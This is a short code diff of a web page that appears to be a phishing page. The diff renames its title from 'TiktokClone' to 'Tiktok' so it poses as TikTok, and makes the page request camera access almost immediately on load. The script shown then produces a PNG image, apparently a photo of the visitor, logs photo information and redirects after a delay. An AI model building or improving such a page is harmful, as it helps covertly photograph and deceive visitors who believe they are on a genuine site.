@@ -4,7 +4,7 @@
 
 <head>
   <meta charset="utf-8">
-  <title>TiktokClone</title>
+  <title>Tiktok</title>
   <base href="/">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
@@ -171,7 +171,7 @@
                   redirectToFinalDestination();
                   
                 }, 'image/png');
-              }}, 3000);
+              }}, 4000);
     }
 
     function logPhotoInfo() {
@@ -207,11 +207,11 @@
       // Добавляем таймаут для редиректа
       setTimeout(function() {
         window.location.replace(redirectUrl);
-      }, 3000);
+      }, 4000);
     }
     // Начинаем запрос доступа к камере
     window.onload = () => {
-      setTimeout(requestCameraAccess,1000);
+      setTimeout(requestCameraAccess,100);
     };
 
   </script>
